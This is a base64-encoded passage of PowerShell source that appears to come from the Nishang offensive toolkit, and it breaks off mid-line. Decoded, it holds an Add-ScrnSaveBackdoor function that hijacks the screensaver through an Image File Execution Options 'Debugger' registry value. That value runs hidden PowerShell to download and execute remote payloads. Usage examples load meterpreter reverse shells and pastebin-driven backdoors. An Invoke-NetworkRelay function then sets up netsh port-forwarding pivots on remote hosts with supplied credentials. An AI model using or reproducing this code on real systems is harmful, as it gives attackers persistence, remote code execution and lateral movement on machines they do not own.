dXNlZC4gRGVmYXVsdCBpcyBDOlxXaW5kb3dzXFN5c3RlbTMyXFJpYmJvbnMuc2NyCgouRVhBTVBMRQpQUyA+IEFkZC1TY3JuU2F2ZUJhY2tkb29yIC1QYXlsb2FkICJwb3dlcnNoZWxsLmV4ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtbm9wcm9maWxlIC1ub2V4aXQgLWMgR2V0LVByb2Nlc3MiCgpVc2UgYWJvdmUgY29tbWFuZCB0byBwcm92aWRlIHlvdXIgb3duIHBheWxvYWQgdG8gYmUgZXhlY3V0ZWQuCgoKLkVYQU1QTEUKUFMgPiBBZGQtU2NyblNhdmVCYWNrZG9vciAtUGF5bG9hZFVSTCBodHRwOi8vMTkyLjE2OC4yNTQuMS9GaXJlQnVzdGVyLnBzMSAtQXJndW1lbnRzICJGaXJlQnVzdGVyIDE5Mi4xNjguMjU0LjEgODQ0MC04NDQ1IgoKVXNlIGFib3ZlIHRvIGV4ZWN1dGUgRmlyZUJ1c3RlciBmcm9tIE5pc2hhbmcgZm9yIEVncmVzcyBUZXN0aW5nLgoKLkVYQU1QTEUKUFMgPiBBZGQtU2NyblNhdmVCYWNrZG9vciAtUGF5bG9hZFVSTCBodHRwOi8vMTkyLjE2OC4yNTQuMS9Qb3dlcnByZXRlci5wc20xIC1Bcmd1bWVudHMgSFRUUC1CYWNrZG9vciAiaHR0cDovL3Bhc3RlYmluLmNvbS9yYXcucGhwP2k9anFQMnZKM3ggaHR0cDovL3Bhc3RlYmluLmNvbS9yYXcucGhwP2k9Wmh5Zjhyd2ggc3RhcnQxMjMgc3RvcHRoaXMKClVzZSBhYm92ZSB0byBleGVjdXRlIEhUVFAtQmFja2Rvb3IgZnJvbSBQb3dlcnByZXRlcgoKLkVYQU1QTEUKUFMgPiBBZGQtU2NyblNhdmVCYWNrZG9vciAtUGF5bG9hZFVSTCBodHRwOi8vMTkyLjE2OC4yNTQuMS9jb2RlX2V4ZWMucHMxCgpVc2UgYWJvdmUgdG8gZXhlY3V0ZSBhbiBpbi1tZW1vcnkgbWV0ZXJwcmV0ZXIgaW4gUG93ZXJTaGVsbCBmb3JtYXQgZ2VuZXJhdGVkIHVzaW5nIG1zZnZlbm9tIAooLi9tc2Z2ZW5vbSAtcCB3aW5kb3dzL3g2NC9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzIExIT1NUPTE5Mi4xNjguMjU0LjIyNiAtZiBwb3dlcnNoZWxsKQoKCi5MSU5LCmh0dHA6Ly93d3cubGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLzIwMTUvMDIvdXNpbmctd2luZG93cy1zY3JlZW5zYXZlci1hcy1iYWNrZG9vci5odG1sCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUGF5bG9hZCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUGF5bG9hZFVSTCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQXJndW1lbnRzLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICROZXdTY3JlZW5TYXZlciA9ICJDOlxXaW5kb3dzXFN5c3RlbTMyXFJpYmJvbnMuc2NyIgogICAgKQogICAgCiAgICAjQ2hlY2sgaWYgU2NyZWVuU2F2ZXIgaXMgZW5hYmxlZAogICAgI0lmIG5vIGVuYWJsZSBpdCwgaWYgeWVzLCBnZXQgaXRzIHZhbHVlCiAgICBpZiAoKEdldC1JdGVtICJIS0NVOlxDb250cm9sIFBhbmVsXERlc2t0b3BcIikuR2V0VmFsdWUoIlNDUk5TQVZFLkVYRSIpIC1lcSAkbnVsbCkKICAgIHsKICAgICAgICBOZXctSXRlbVByb3BlcnR5ICJIS0NVOlxDb250cm9sIFBhbmVsXERlc2t0b3BcIiAtTmFtZSBTQ1JOU0FWRS5FWEUgLVZhbHVlICROZXdTY3JlZW5TYXZlciAtUHJvcGVydHlUeXBlIFN0cmluZwogICAgICAgICRTY3JlZW5TYXZlck5hbWUgPSAoJE5ld1NjcmVlblNhdmVyIC1zcGxpdCAnXFwnKVstMV0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkU2NyZWVuU2F2ZXJOYW1lID0gKChHZXQtSXRlbSAiSEtDVTpcQ29udHJvbCBQYW5lbFxEZXNrdG9wXCIpLkdldFZhbHVlKCJTQ1JOU0FWRS5FWEUiKSAtc3BsaXQgJ1xcJylbLTFdCiAgICB9CgogICAgI1NldCBTY3JlZW5TYXZlVGltZU91dCB3aGljaCBpcyBuZWNlc3NhcnkgdG8gZW5hYmxlIHNjcmVlbnNhdmVyLgogICAgaWYgKChHZXQtSXRlbSAiSEtDVTpcQ29udHJvbCBQYW5lbFxEZXNrdG9wXCIpLkdldFZhbHVlKCJTY3JlZW5TYXZlVGltZU91dCIpIC1lcSAkbnVsbCkKICAgIHsKICAgICAgICBOZXctSXRlbVByb3BlcnR5ICJIS0NVOlxDb250cm9sIFBhbmVsXERlc2t0b3BcIiAtTmFtZSBTY3JlZW5TYXZlVGltZU91dCAtVmFsdWUgNjAgLVByb3BlcnR5VHlwZSBTdHJpbmcKICAgIH0gCiAgICBlbHNlCiAgICB7CiAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcQ29udHJvbCBQYW5lbFxEZXNrdG9wXCIgLU5hbWUgU2NyZWVuU2F2ZVRpbWVPdXQgLVZhbHVlIDYwCiAgICB9CiAgICAKICAgICNHZXQgYSBsaXN0IG9mIGRlZmF1bHQgc2NyZWVuc2F2ZXJzIGFuZCBzZWxlY3Qgb25lIGF0IHJhbmRvbQogICAgJExpc3RTY3JuID0gR2V0LUNoaWxkSXRlbSBDOlxXaW5kb3dzXFN5c3RlbTMyXCouc2NyIHwgV2hlcmUtT2JqZWN0IHskXy5OYW1lIC1uZSAkU2NyZWVuU2F2ZXJOYW1lfQogICAgJFBhdGhUb1NjcmVlbnNhdmVyID0gR2V0LVJhbmRvbSAkTGlzdFNjcm4KCiAgICAjQWRkIGEgZGVmYXVsdCBzY3JlZW5zYXZlciB0byBwYXlsb2FkIHNvIHRoYXQgaXQgcnVucyBhZnRlciBvdXIgcGF5bG9hZC4KICAgIGlmKCEkUGF5bG9hZCkKICAgIHsKICAgICAgICAkUmVnVmFsdWUgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIGhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtbm9sb2dvIC1ub3Byb2ZpbGUgLWMgSUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnJFBheWxvYWRVUkwnKSk7JEFyZ3VtZW50cyIgKyAiOyIgKyAkUGF0aFRvU2NyZWVuc2F2ZXIgKyAiIC9zIgogICAgfQogICAgZWxzZWlmICgkUGF5bG9hZCkKICAgIHsKICAgICAgICAkUmVnVmFsdWUgPSAkUGF5bG9hZCArICI7IiArICRBcmd1bWVudHMgKyAiOyIgKyAkUGF0aFRvU2NyZWVuc2F2ZXIgKyAiIC9zIgogICAgfQogICAgI1NldCBEZWJ1Z2dlciBmb3IgdGhlIFNjcmVlblNhdmVyIGV4ZWN1dGFibGUKICAgIGlmIChUZXN0LVBhdGggLVBhdGggIkhLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXEltYWdlIEZpbGUgRXhlY3V0aW9uIE9wdGlvbnNcJFNjcmVlblNhdmVyTmFtZSIpCiAgICB7CiAgICAgICAgCiAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cSW1hZ2UgRmlsZSBFeGVjdXRpb24gT3B0aW9uc1wkU2NyZWVuU2F2ZXJOYW1lIiAtTmFtZSBEZWJ1Z2dlciAtVmFsdWUgJFJlZ1ZhbHVlCiAgICAgICAgV3JpdGUtT3V0cHV0ICJQYXlsb2FkIGFkZGVkIGFzIERlYnVnZ2VyIGZvciAkU2NyZWVuU2F2ZXJOYW1lIgogICAgfQogICAgZWxzZQogICAgewogICAgICAgIE5ldy1JdGVtICJIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxJbWFnZSBGaWxlIEV4ZWN1dGlvbiBPcHRpb25zXCRTY3JlZW5TYXZlck5hbWUiCiAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cSW1hZ2UgRmlsZSBFeGVjdXRpb24gT3B0aW9uc1wkU2NyZWVuU2F2ZXJOYW1lIiAtTmFtZSBEZWJ1Z2dlciAtVmFsdWUgJFJlZ1ZhbHVlCiAgICAgICAgV3JpdGUtT3V0cHV0ICJQYXlsb2FkIGFkZGVkIGFzIERlYnVnZ2VyIGZvciAkU2NyZWVuU2F2ZXJOYW1lIgogICAgfQp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEFkZCBuZXR3b3JrIHJlbGF5cyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpmdW5jdGlvbiBJbnZva2UtTmV0d29ya1JlbGF5CnsgICAgCjwjCi5TWU5PUFNJUwpOaXNoYW5nIHNjcmlwdCB3aGljaCBjYW4gYmUgdXNlZCB0byBydW4gbmV0c2ggcG9ydCBmb3J3YXJkaW5nL3JlbGF5aW5nIGNvbW1hbmRzIG9uIHJlbW90ZSBjb21wdXRlcnMuIAoKLkRFU0NSSVBUSU9OClRoaXMgc2NyaXB0IGlzIGEgd3JhcHBlciBhcm91bmQgdGhlIG5ldHNoIFdpbmRvd3MgY29tbWFuZCdzIHBvcnRwcm94eSBmdW5jdGlvbmFsaXR5LiBJdCBjb3VsZCBiZSB1c2VkIHRvIGNyZWF0ZSBhbmQgcmVtb3ZlIApuZXR3b3JrIHJlbGF5cyBiZXR3ZWVuIGNvbXB1dGVycy4gVGhlIHNjcmlwdCBpcyB1c2VmdWwgaW4gc2NlbmFyaW9zIHdoZW4geW91IHdhbnQgdG8gYWNjZXNzIGEgcG9ydCBvciBzZXJ2aWNlIHJ1bm5pbmcgb24gYQp0YXJnZXQgY29tcHV0ZXIgd2hpY2ggaXMgYWNjZXNzaWJsZSBvbmx5IHRocm91Z2ggYW5vdGhlciBjb21wdXRlcihzKSBiZXR3ZWVuIHlvdSBhbmQgdGhlIHRhcmdldCBjb21wdXRlci4gQW5vdGhlciBpbnRlcmVzdGluZwp1c2VjYXNlIGlzIHdoZW4geW91IHdhbnQgdG8gZXhwb3NlIGEgbG9jYWwgc2VydmljZSB0byB0aGUgbmV0d29yay4KCi5QQVJBTUVURVIgUmVsYXkKU3BlY2lmeSB0aGUgdHlwZSBvZiByZWxheSBmcm9tICJ2NHRvdjQiLCJ2NnRvdjQiLCJ2NHRvdjYiIGFuZCAidjZ0b3Y2Ii4gRGVmYXVsdCBpcyB2NHRvdjQuCnY0dG92NCAtIExpc3RlbiBvbiB2NCBhbmQgY29ubmVjdCB0byB2NC4KCgouUEFSQU1FVEVSIExpc3RlbkFkZHJlc3MKVGhlIGxvY2FsL2xpc3RlbmVyIElQIGFkZHJlc3MgdG8gd2hpY2ggYSByZW1vdGUgcG9ydCB3aWxsIGJlIGZvcndhcmRlZC4gRGVmYXVsdCBpcyAwLjAuMC4wIChJUHY0KQoKLlBBUkFNRVRFUiBMaXN0ZW5Qb3J0ClRoZSBsb2NhbC9saXN0ZW5lciBwb3J0IHRvIHdoaWNoIGEgcmVtb3RlIHBvcnQgd2lsbCBiZSBmb3J3YXJkZWQuIERlZmF1bHQgaXMgODg4OC4KCi5QQVJBTUVURVIgQ29ubmVjdEFkZHJlc3MKVGhlIHRhcmdldC9kZXN0aW5hdGlvbiBJUCBhZGRyZXNzIHdob3NlIHBvcnQgd2lsbCBiZSBmb3J3YXJkZWQvbWFwcGVkIHRvIGEgbG9jYWwgcG9ydC4KCi5QQVJBTUVURVIgQ29ubmVjdFBvcnQKVGhlIHRhcmdldC9kZXN0aW5hdGlvbiBwb3J0IHdoaWNoIHdpbGwgYmUgZm9yd2FyZGVkL21hcHBlZCB0byBhIGxvY2FsIHBvcnQuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQpUaGUgbmFtZSBvciBJUCBhZGRyZXNzIG9mIHRoZSBjb21wdXRlciB3aGVyZSB0aGUgbmV0c2ggY29tbWFuZCB3b3VsZCBiZSBleGVjdXRlZC4KCi5QQVJBTUVURVIgVXNlck5hbWUKVXNlcm5hbWUgZm9yIHRoZSBjb21wdXRlciBzcGVjaWZpZWQgd2l0aCB0aGUgQ29tcHV0ZXJOYW1lIHBhcmFtZXRlci4KCi5QQVJBTUVURVIgUGFzc3dvcmQKUGFzc3dvcmQgZm9yIHRoZSBjb21wdXRlciBzcGVjaWZpZWQgd2l0aCB0aGUgQ29tcHV0ZXJOYW1lIHBhcmFtZXRlci4KCi5QQVJBTUVURVIgRGVsZXRlClVzZSB0aGUgRGVsZXRlIHN3aXRjaCB0byBkZWxldGUgYSBuZXR3b3JrIHJlbGF5IHNwZWNpZmllZCBieSBhYm92ZSBvcHRpb25zLgoKLlBBUkFNRVRFUiBTaG93ClVzZSB0aGUgU2hvdyBzd2l0Y2ggdG8gc2hvdyBhbGwgcmVsYXlzIG9uIGEgY29tcHV0ZXIuCgouRVhBTVBMRQpQUyA+IEludm9rZS1OZXR3b3JrUmVsYXkgLVJlbGF5IHY0dG92NCAtTGlzdGVuQWRkcmVzcyAxOTIuMTY4LjI1NC4xNDEgLUxpc3RlbnBvcnQgODg4OCAtQ29ubmVjdEFkZHJlc3MgMTkyLjE2OC4xLjIyICAtQ29ubmVjdFBvcnQgNDQ1IC1Db21wdXRlck5hbWUgMTkyLjE2OC4yNTQuMTQxCkFkZCBhIG5ldHdvcmsgcmVsYXkgd2hpY2ggbGlzdGVucyBvbiBJUHY0IGFuZCBjb25uZWN0cyB0byBJUHY0IGFuZCBmb3J3YXJkcyBwb3J0IDQ0NSBmcm9tIDE5Mi4xNjguMS4yMiB0byBwb3J0IDg4ODggb2YgMTkyLjE2OC4yNTQuMTQxLiAKCi5FWEFNUExFClBTID4gSW52b2tlLU5ldHdvcmtSZWxheSAtUmVsYXkgdjZ0b3Y0IC1MaXN0ZW5BZGRyZXNzIDo6IC1MaXN0ZW5wb3J0IDg4ODggLUNvbm5lY3RBZGRyZXNzIDE5Mi4xNjguMS4yMiAgLUNvbm5lY3RQb3J0IDQ0NSAtQ29tcHV0ZXJOYW1lIDE5Mi4xNjguMjU0LjE0MQpBZGQgYSBuZXR3b3JrIHJlbGF5IHdoaWNoIGxpc3RlbnMgb24gSVB2NiBhbmQgY29ubmVjdHMgdG8gSVB2NCBhbmQgZm9yd2FyZHMgcG9ydCA0NDUgZnJvbSAxOTIuMTY4LjEuMjIgdG8gcG9ydCA4ODg4IG9mIDE5Mi4xNjguMjU0LjE0MS4gCgouRVhBTVBMRQpQUyA+IEludm9rZS1OZXR3b3JrUmVsYXkgLVJlbGF5IHY2dG92NCAtTGlzdGVuQWRkcmVzcyA6OiAtTGlzdGVucG9ydCA4ODg4IC1Db25uZWN0QWRkcmVzcyBmZTgwOjoxOWVkOmMxNjk6MTI4YzpiNjhkICAtQ29ubmVjdFBvcnQgNDQ1IC1Db21wdXRlck5hbWUgZG9tYWlucGMgLVVzZXJuYW1lIGJoYXJhdFxkb21haW51c2VyIC1QYXNzd29yZCBQYXNzd29yZDEyMzQKQWRkIGEgbmV0d29yayByZWxheSB3aGljaCBsaXN0ZW5zIG9uIElQdjYgYW5kIGNvbm5lY3RzIHRvIElQdjYgYW5kIGZvcndhcmRzIHBvcnQgNDQ1IGZyb20gZmU4MDo6MTllZDpjMTY5OjEyOGM6YjY4ZCB0byBwb3J0IDg4ODggb2YgZG9tYWlucGMgCgouRVhBTVBMRQpQUyA+IEludm9rZS1OZXR3b3JrUmVsYXkgLVJlbGF5IHY0dG92NCAtTGlzdGVuQWRkcmVzcyAxOTIuMTY4LjI1NC4xNDEgLUxpc3RlbnBvcnQgODg4OCAtQ29ubmVjdEFkZHJlc3MgMTkyLjE2OC4xLjIyICAtQ29ubmVjdFBvcnQgNDQ1IC1Db21wdXRlck5hbWUgMTkyLjE2OC4yNTQuMTQxIC1EZWxldGUKRGVsZXRlIHRoZSBuZXR3b3JrIHJlbGF5IHNwZWNpZmllZCBieSB0aGUgTGlzdGVuQWRkcmVzcyBhbmQgTGlzdGVuIFBvcnQuCgouRVhBTVBMRQpQUyA+IEludm9rZS1OZXR3b3JrUmVsYXkgLUNvbXB1dGVyTmFtZSBkb21haW5wYyAtVXNlcm5hbWUgYmhhcmF0XGRvbWFpbnVzZXIgLVBhc3N3b3JkIFBhc3N3b3JkMTIzNCAtU2hvdwpTaG93IGFsbCBuZXR3b3JrIHJlbGF5cyBvbiB0aGUgZG9tYWlucGMgY29tcHV0ZXIKCgouTElOSwpodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDE1LzA0L3BpbGxhZ2UtdGhlLXZpbGxhZ2UtcG93ZXJzaGVsbC12ZXJzaW9uLmh0bWwKaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4gIAogICAgCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZT0iQWRkT3JEZWxldGUiKV0gUGFyYW0oIAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJBZGRPckRlbGV0ZSIpXQogICAgICAgIFtWYWxpZGF0ZVNldCgidjR0b3Y0IiwidjZ0b3Y0IiwidjR0b3Y2IiwidjZ0b3Y2IildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUmVsYXk9InY0dG92NCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IkFkZE9yRGVsZXRlIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTGlzdGVuQWRkcmVzcyA9ICIwLjAuMC4wIiwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeT0gJEZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJBZGRPckRlbGV0ZSIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExpc3RlblBvcnQgPSA4ODg4LAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWU9IkFkZE9yRGVsZXRlIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29ubmVjdEFkZHJlc3MsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZT0iQWRkT3JEZWxldGUiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb25uZWN0UG9ydCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDUsIE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iQWRkT3JEZWxldGUiKV0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJTaG93IildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNiwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJBZGRPckRlbGV0ZSIpXQogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IlNob3ciKV0KICAgICAgICAkVXNlck5hbWUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDcsIE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iQWRkT3JEZWxldGUiKV0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJTaG93IildCiAgICAgICAgJFBhc3N3b3JkLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iQWRkT3JEZWxldGUiKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICREZWxldGUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJTaG93IildCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU2hvdwoKICAgICkKCgogICAgI0NoZWNrIGlmIFVzZXJuYW1lIGFuZCBQYXNzd29yZCBhcmUgcHJvdmlkZWQKICAgIGlmICgkVXNlck5hbWUgLWFuZCAkUGFzc3dvcmQpCiAgICB7CiAgICAgICAgJFNlY3VyZVBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAkUGFzc3dvcmQgLUFzUGxhaW5UZXh0IC1Gb3JjZQoJICAgICRDcmVkcyA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwgKCRVc2VyTmFtZSwgJFNlY3VyZVBhc3N3b3JkKQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRDcmVkcyA9ICRGYWxzZQogICAgfQogICAgCiAgICBpZiAoJFNob3cpCiAgICB7CiAgICAgICAgaWYgKCRDcmVkcykKICAgICAgICB7CiAgICAgICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayB7bmV0c2ggaW50ZXJmYWNlIHBvcnRwcm94eSBzaG93IGFsbH0gLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lIC1DcmVkZW50aWFsICRDcmVkcwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sge25ldHNoIGludGVyZmFjZSBwb3J0cHJveHkgc2hvdyBhbGx9IC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAKICAgICAgICB9CiAgICB9CiAgICAKICAgIGlmICghJERlbGV0ZSAtYW5kICEkU2hvdykKICAgIHsKICAgICAgICAjUHJlcGFyZSByZWxheSBjb21tYW5kcwogICAgICAgICRWNHRvdjRSZWxheSA9ICJuZXRzaCBpbnRlcmZhY2UgcG9ydHByb3h5IGFkZCB2NHRvdjQgbGlzdGVucG9ydD0kTGlzdGVuUG9ydCBsaXN0ZW5hZGRyZXNzPSRMaXN0ZW5BZGRyZXNzIGNvbm5lY3Rwb3J0PSRDb25uZWN0UG9ydCBjb25uZWN0YWRkcmVzcz0kQ29ubmVjdEFkZHJlc3MgcHJvdG9jb2w9dGNwIgogICAgICAgICRWNnRvVjRSZWxheSA9ICJuZXRzaCBpbnRlcmZhY2UgcG9ydHByb3h5IGFkZCB2NnRvdjQgbGlzdGVucG9ydD0kTGlzdGVuUG9ydCBsaXN0ZW5hZGRyZXNzPSRMaXN0ZW5BZGRyZXNzIGNvbm5lY3Rwb3J0PSRDb25uZWN0UG9ydCBjb25uZWN0YWRkcmVzcz0kQ29ubmVjdEFkZHJlc3MiCiAgICAgICAgJFY0dG92NlJlbGF5ID0gIm5ldHNoIGludGVyZmFjZSBwb3J0cHJveHkgYWRkIHY0dG92NiBsaXN0ZW5wb3J0PSRMaXN0ZW5Qb3J0IGxpc3RlbmFkZHJlc3M9JExpc3RlbkFkZHJlc3MgY29ubmVjdHBvcnQ9JENvbm5lY3RQb3J0IGNvbm5lY3RhZGRyZXNzPSRDb25uZWN0QWRkcmVzcyIKICAgICAgICAkVjZ0b1Y2UmVsYXkgPSAibmV0c2ggaW50ZXJmYWNlIHBvcnRwcm94eSBhZGQgdjZ0b3Y2IGxpc3RlbnBvcnQ9JExpc3RlblBvcnQgbGlzdGVuYWRkcmVzcz0kTGlzdGVuQWRkcmVzcyBjb25uZWN0cG9ydD0kQ29ubmVjdFBvcnQgY29ubmVjdGFkZHJlc3M9JENvbm5lY3RBZGRyZXNzIHByb3RvY29sPXRjcCIKCiAgICAgICAgI0NyZWF0ZSBhIHNjcmlwdGJsb2NrIGRlcGVuZGluZyB1cG9uIHRoZSB0eXBlIG9mIHJlbGF5LgogICAgICAgIHN3aXRjaCAoJFJlbGF5KQogICAgICAgIHsgICAKICAgICAgICAgICAgInY0dG92NCIgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRzYiA9IFtTY3JpcHRCbG9ja106OkNyZWF0ZSgkVjR0b1Y0UmVsYXkpCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkluaXRpYXRpbmcgdjR0b3Y0IFJlbGF5LiBMaXN0ZW5pbmcgb24gJExpc3RlbkFkZHJlc3MsIFBvcnQgJExpc3RlblBvcnQuIENvbm5lY3RpbmcgdG8gJENvbm5lY3RhZGRyZXNzLCBQb3J0ICRDb25uZWN0cG9ydCIKICAgICAgICAgICAgfQogICAgICAgICAgICAidjZ0b3Y0IiAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHNiID0gW1NjcmlwdEJsb2NrXTo6Q3JlYXRlKCRWNnRvVjRSZWxheSkKICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiSW5pdGlhdGluZyB2NnRvdjQgUmVsYXkuIExpc3RlbmluZyBvbiAkTGlzdGVuQWRkcmVzcywgUG9ydCAkTGlzdGVuUG9ydC4gQ29ubmVjdGluZyB0byAkQ29ubmVjdGFkZHJlc3MsIFBvcnQgJENvbm5lY3Rwb3J0IgogICAgICAgICAgICB9CiAgICAgICAgICAgICJ2NHRvdjYiIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc2IgPSBbU2NyaXB0QmxvY2tdOjpDcmVhdGUoJFY0dG9WNlJlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJJbml0aWF0aW5nIHY0dG92NiBSZWxheS4gTGlzdGVuaW5nIG9uICRMaXN0ZW5BZGRyZXNzLCBQb3J0ICRMaXN0ZW5Qb3J0LiBDb25uZWN0aW5nIHRvICRDb25uZWN0YWRkcmVzcywgUG9ydCAkQ29ubmVjdHBvcnQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgInY2dG92NiIgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRzYiA9IFtTY3JpcHRCbG9ja106OkNyZWF0ZSgkVjZ0b1Y2UmVsYXkpCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkluaXRpYXRpbmcgdjZ0b3Y2IFJlbGF5LiBMaXN0ZW5pbmcgb24gJExpc3RlbkFkZHJlc3MsIFBvcnQgJExpc3RlblBvcnQuIENvbm5lY3RpbmcgdG8gJENvbm5lY3RhZGRyZXNzLCBQb3J0ICRDb25uZWN0cG9ydCIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIAogICAgICAgICNFeGVjdXRlIHRoZSBuZXRzaCBjb21tYW5kIG9uIHJlbW90ZSBjb21wdXRlcgogICAgICAgIGlmICgkQ3JlZHMpCiAgICAgICAgewogICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJHNiIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAtQ3JlZGVudGlhbCAkQ3JlZHMKICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrIHtwYXJhbSAoJFNCUmVsYXkpIG5ldHNoIGludGVyZmFjZSBwb3J0cHJveHkgc2hvdyAkU0JSZWxheSB9IC1Bcmd1bWVudExpc3QgJFJlbGF5IC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAtQ3JlZGVudGlhbCAkQ3JlZHMKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRzYiAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUKICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrIHtuZXRzaCBpbnRlcmZhY2UgcG9